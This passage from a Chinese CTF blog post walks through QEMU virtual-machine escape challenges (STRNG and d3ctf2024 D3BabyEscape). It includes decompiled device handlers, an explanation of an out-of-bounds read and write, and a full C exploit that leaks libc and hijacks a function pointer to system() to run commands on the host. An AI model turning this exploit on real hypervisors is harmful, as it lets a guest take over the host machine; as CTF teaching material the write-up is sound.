&#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *((_DWORD *)opaque + <span class="number">700</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v4 &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + (v4 &gt;&gt; <span class="number">2</span>) + <span class="number">701</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + <span class="number">700</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PMIO 的 read 功能则是进行数据读取：</p>
<ul>
<li>若 <code>addr == 0</code> ，则返回 <code>(unsigned int *)opaque[700]</code> 的值。</li>
<li>若 <code>addr == 4</code> ，则获取 <code>(unsigned int *)opaque[700]</code> 的值 <code>v4</code>，若低 2 位为 0 则返回 <code>opaque-&gt;buf[(v4 &gt;&gt; 2)]</code> 上数据。</li>
</ul>
<p>若我们能够控制 <code>(unsigned int *)opaque[700]</code> 的值，则可以直接完成一个越界读。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *((_DWORD *)opaque + <span class="number">700</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v4 &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v4 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_DWORD *)opaque + <span class="number">702</span>) = (*((__int64 (__fastcall **)(<span class="type">void</span> *, __int64, <span class="type">uint64_t</span>))opaque + <span class="number">384</span>))(</span><br><span class="line">                                          opaque,</span><br><span class="line">                                          <span class="number">4LL</span>,</span><br><span class="line">                                          val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">3</span> )</span><br><span class="line">              *((_DWORD *)opaque + <span class="number">704</span>) = (*((__int64 (__fastcall **)(<span class="type">char</span> *, __int64, <span class="type">uint64_t</span>))opaque + <span class="number">385</span>))(</span><br><span class="line">                                            (<span class="type">char</span> *)opaque + <span class="number">2812</span>,</span><br><span class="line">                                            <span class="number">4LL</span>,</span><br><span class="line">                                            val);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              *((_DWORD *)opaque + v5 + <span class="number">701</span>) = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            (*((<span class="type">void</span> (__fastcall **)(_QWORD))opaque + <span class="number">383</span>))((<span class="type">unsigned</span> <span class="type">int</span>)val);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)opaque + <span class="number">700</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>PMIO 的 write 功能定义如下：</p>
<ul>
<li>若 <code>addr == 0</code>，则将传入的值写入 <code>(unsigned int *)opaque[700]</code> ，因此结合 PMIO read 我们便可以完成越界读。</li>
<li>若 <code>addr == 4</code>，则获取 <code>(unsigned int *)opaque[700]</code> 的值 <code>v4</code>，若低 2 位为 0 则取 <code>v5 = v4 &gt;&gt;2</code>：</li>
<li>若 <code>v5 == 1</code>，则调用 <code>(u64*)opaque[384]</code> 处函数指针，返回值写入 <code>opaque-&gt;buf[1]</code>，参数见代码</li>
<li>若 <code>v5 == 3</code>，则调用 <code>(u64*)opaque[385]</code> 处函数指针，返回值写入 <code>opaque-&gt;buf[3]</code>，参数见代码</li>
<li>若 <code>v5 != 0</code>，则将传入的值写入 <code>opaque-&gt;buf[v5]</code></li>
<li>若 <code>v5 == 1</code>，则调用 <code>(u64*)opaque[383]</code> 处函数指针，参数为我们传入的值</li>
</ul>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于 PMIO read 功能的读取地址由 <code>(unsigned int *)opaque[700]</code> 决定，而该值可以通过 PMIO write 写入 <code>addr == 0</code> 处进行修改</p>
<p>由于题目一开始便在 <code>opaque</code> 靠后的放置了一些<strong>libc指针</strong>，因此我们可以通过读取这些函数指针泄露 libc 基址。</p>
<p>同样地，当 <code>addr == 4</code> 时，PMIO write 会向指定地址 + 偏移处写入数据，而该偏移值为我们可控的 <code>(unsigned int *)opaque[700]</code>，因此我们可以非常方便地劫持 <code>opaque</code> 上的函数指针，而这些函数指针又可以通过 MMIO write 与 PMIO write 进行触发，因此不难想到的是我们可以通过劫持这些函数指针来完成控制流劫持。</p>
<p>当 <code>(unsigned int *)opaque[700] == 3</code> 时，调用函数指针会传入一个 <code>opaque</code> 上地址作为第一个参数，而该处数据同样是我们可控的，因此我们可以在该处先写入字符串后再劫持函数指针为 <code>system()</code> 后直接调用即可完成 Host 上的任意命令执行。</p>
<h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><p>QEMU pwn 题会提供给我们一个 local Linux 环境，通常都有着 root 权限（除了一些套娃题目会要求选手先完成提权），通常我们需要使用 C 编写 exp，将其进行静态编译后传输到远程运行。有的题目也会提供本地编译环境（例如本题），这样我们便只需要传输 exp 的源代码到远程再编译运行即可。</p>
<p>首先说一下与题目进行交互的方式。QEMU pwn 的漏洞通常出现在一个自定义 PCI 设备中，我们可以通过 <code>lspci</code> 命令查看现有的 PCI 设备，在每个设备开头都可以看到形如 <code>xx:yy.z</code> 的十六进制编号，这个格式其实是 <code>总线编号:设备编号.功能编号</code>，当我们使用 <code>lspci -v</code>查看 PCI 设备信息时，在总线编号前面的 4 位数字便是 PCI 域的编号。</p>
<p>通常我们可以看到一个未被识别的设备，这通常便是题目设备。这里我们可以看到 PMIO 地址为 <code>0xc050</code>，MMIO 地址（物理地址）为 <code>0xfebf1000</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">	Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">	Physical Slot: 3</span><br><span class="line">	Flags: fast devsel</span><br><span class="line">	Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">	I/O ports at c050 [size=8]</span><br></pre></td></tr></table></figure>
<p><strong>PMIO</strong></p>
<p>先通过 <code>iopl(3)</code> 获取交互权限，接下来直接使用 <code>in()</code> 与 <code>out()</code> 系函数即可读写端口，需要注意的是<strong>端口地址应与读写长度对齐</strong>（例如读写 4 字节则端口地址需要对齐到 4</p>
<p><strong>MMIO</strong></p>
<p>通过 <code>mmap()</code> 映射 sysfs 下的资源文件来完成内存访问。以本题为例，通过 <code>lspci</code> 命令获取到的编号为 <code>00:03.0</code>，那么我们便可以通过 <code>mmap()</code> 映射 <code>/sys/devices/pci0000:00/0000:00:03.0/resource0</code> 文件直接完成 MMIO。类似于 PMIO，MMIO 的读写地址同样需要对齐到读写长度。</p>
<p>同样的,其实也可以通过映射 <code>/sys/devices/pci0000:00/0000:00:03.0/resource1</code> 文件的形式来以内存读写的形式完成 PMIO。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>来自wiki</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_MMIO_REGS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_MMIO_SIZE (STRNG_MMIO_REGS * sizeof(uint32_t))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_ADDR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_DATA 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_REGS STRNG_MMIO_REGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_SIZE 8</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> calc_str[<span class="number">0x100</span>] = <span class="string">&quot;;cat ./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span> sh_str[<span class="number">0x100</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> *addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    *addr = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val, port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span>    mmio_addr;</span><br><span class="line">    <span class="type">uint32_t</span>    pmio_port = <span class="number">0xc050</span>;</span><br><span class="line">    <span class="type">int</span>         mmio_fd;</span><br><span class="line">    <span class="type">uint32_t</span>    srand_addr_low, srand_addr_high;</span><br><span class="line">    <span class="type">uint64_t</span>    srand_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    libc_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    system_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,</span><br><span class="line">            O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to open mmio file! wrong path or no root?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to change i/o privilege! no root?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_addr = (<span class="type">uint64_t</span>)</span><br><span class="line">            mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_addr == MAP_FAILED) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to mmap mmio space!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * regs[3] is not writable, because for addr 3 the rand_r() will be called</span></span><br><span class="line"><span class="comment">     * so we fill some useless string there</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        mmio_write((<span class="type">uint32_t</span>*)(mmio_addr + ((<span class="number">2</span> + i) &lt;&lt; <span class="number">2</span>)), (<span class="type">uint32_t</span>*)<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        mmio_write((<span class="type">uint32_t</span>*)(mmio_addr + ((<span class="number">6</span> + i) &lt;&lt; <span class="number">2</span>)), ((<span class="type">uint32_t</span>*)calc_str)[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * exploitation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.I - leaking libc addr</span></span><br><span class="line"><span class="comment">     * set the strng-&gt;addr by pmio_write to a oob val</span></span><br><span class="line"><span class="comment">     * so that we can make an oob read by pmio_read</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Stage.I - leaking libc addr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    srand_addr_low = pmio_read(pmio_port + STRNG_PMIO_DATA);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">2</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    srand_addr_high = pmio_read(pmio_port + STRNG_PMIO_DATA);</span><br><span class="line"></span><br><span class="line">    srand_addr = srand_addr_high;</span><br><span class="line">    srand_addr &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">    srand_addr += srand_addr_low;</span><br><span class="line">    libc_addr = srand_addr - <span class="number">0x460a0</span>;</span><br><span class="line">    system_addr = libc_addr + <span class="number">0x50d60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get addr of srand: 0x%llx\n&quot;</span>, srand_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] libc addr: 0x%llx\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system addr: 0x%llx\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.II - overwrite the rand_r ptr</span></span><br><span class="line"><span class="comment">     * set the strng-&gt;rand_r to system by oob write in pmio</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[*] Stage.II - overwrite the rand_r ptr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">5</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, (<span class="type">uint32_t</span>) system_addr);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">6</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, (<span class="type">uint32_t</span>) (system_addr &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] write done!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.III - control flow hijack!</span></span><br><span class="line"><span class="comment">     * call the strng-&gt;rand_r by pmio_write and hijack the control flow!</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[*] Stage.III - control flow hijack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger the strng-&gt;rand_r()...&quot;</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, <span class="number">3</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="d3ctf2024-D3BabyEscape"><a href="#d3ctf2024-D3BabyEscape" class="headerlink" title="d3ctf2024-D3BabyEscape"></a>d3ctf2024-D3BabyEscape</h2><p>前几天的d3ctf,还热乎的题目,十分适合新手</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This challenge is very easy and could be used as an entry-level study for qemu escape.</span><br></pre></td></tr></table></figure>
<p>看启动脚本,添加了一个自定义的设备l0dev</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L ../pc-bios/ \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel vmlinuz \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-device l0dev</span><br></pre></td></tr></table></figure>
<p>ida打开qemu文件,搜索字符串l0dev</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000AC4201	0000001E	C	../qemu-7.0.0/hw/misc/l0dev.c</span><br><span class="line">.rodata:0000000000AC421F	00000006	C	l0dev</span><br><span class="line">.rodata:0000000000AC4225	0000000B	C	l0dev-mmio</span><br><span class="line">.rodata:0000000000AC4230	0000000B	C	l0dev-pmio</span><br><span class="line">.rodata:0000000000AC4270	00000010	C	l0dev_mmio_read</span><br><span class="line">.rodata:0000000000AC4280	00000010	C	l0dev_pmio_read</span><br><span class="line">.rodata:0000000000AC4290	00000011	C	l0dev_mmio_write</span><br><span class="line">.rodata:0000000000AC42B0	00000011	C	l0dev_pmio_write</span><br><span class="line">.rodata:0000000000AC42C8	0000000E	C	l0dev_realize</span><br><span class="line">.rodata:0000000000AC42E0	00000014	C	l0dev_instance_init</span><br></pre></td></tr></table></figure>
<p>比较难绷的是qemu并没有调试符号</p>
<p>所以并不能直接搜索到l0dev的函数,但影响不大,通过字符串引用照样能找到对应的函数</p>
<p>mmio_read</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4809AE</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x52</span>u, (__int64)<span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * v7 + len &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">char</span> *)v6 + (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)v6 + <span class="number">640</span>) + addr) + <span class="number">3124</span>, len);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对申请地址进行8字节对齐,然后地址范围不允许超过0x100</p>
<p>之后将<code>v6+v6[640]+addr+3124</code>处的数据复制到dest并返回,此处就潜藏着内存越界的风险</p>
<p>mmio_write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> ****__fastcall <span class="title function_">sub_480B84</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">const</span> <span class="type">char</span> ****addr, __int64 val, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// 